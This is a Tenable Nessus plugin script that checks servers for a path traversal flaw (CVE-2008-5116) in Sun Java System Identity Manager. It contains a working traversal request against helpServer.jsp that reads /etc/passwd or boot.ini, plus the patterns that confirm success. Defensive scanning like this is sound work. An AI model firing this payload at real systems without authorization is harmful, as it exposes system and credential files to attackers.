#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(38695);
  script_version("1.22");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-5116");
  script_bugtraq_id(32262);
  script_xref(name:"SECUNIA", value:"32606");

  script_name(english:"Sun Java System Identity Manager ext Parameter Arbitrary File Retrieval");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that allows arbitrary
file retrieval.");
  script_set_attribute(attribute:"description", value:
"The version of Sun Java System Identity Manager hosted on the
remote web server fails to sanitize user-supplied input to 'ext' parameter
in file 'includes/helpServer.jsp' before using it to display help
files.  An unauthenticated attacker can exploit this vulnerability to
retrieve arbitrary files from the remote system. 

Note that this installation is likely affected by several other issues
as documented in Sun's advisory, although Nessus has not checked for
them.");
  script_set_attribute(attribute:"see_also", value:"http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr08-09");
  script_set_attribute(attribute:"see_also", value:"http://xforce.iss.net/xforce/xfdb/46554");
  script_set_attribute(attribute:"see_also", value:"https://download.oracle.com/sunalerts/1019669.1.html");
  script_set_attribute(attribute:"solution", value:
"Apply vendor-supplied patches.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"patch_publication_date", value:"2008/04/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/05/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sun:java_system_identity_manager");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("sun_idm_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("data_protection.inc");

port = get_http_port(default:8080, embedded: 0);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = 'boot.ini';
  else file = 'etc/passwd';
  files = make_list(file);
}
else files = make_list('etc/passwd', 'boot.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['boot.ini'] = "[boot loader]";

# Test an install.

install = get_kb_item(string("www/", port, "/sun_idm"));
if (isnull(install)) exit(0);

matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  foreach file (files) 
  {
    exploit = string("includes/helpServer.jsp?ext=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\",file);
 
    url = string(dir,"/",exploit);
    res = http_send_recv3(method:"GET", 
          item:url, 
          port:port,
          add_headers: make_array("Content-Type", "application/xhtml+xml",
            "Accept","text/html,application/xhtml+xml,application/xml")
        );

    if (isnull(res)) exit(0);

    if(file_pats[file] >< res[2])
    {
      if (report_verbosity > 0)
      {
        file = '/' + file;
        if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

        report = string(
          "\n",
          "Nessus was able to exploit the issue to retrieve the contents of\n",
          "'", file, "' on the remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          res[2] = data_protection::redact_etc_passwd(output:res[2]);
          report += string(
            "\n",
            "Here are its contents :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            res[2],
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    } 
  }
}
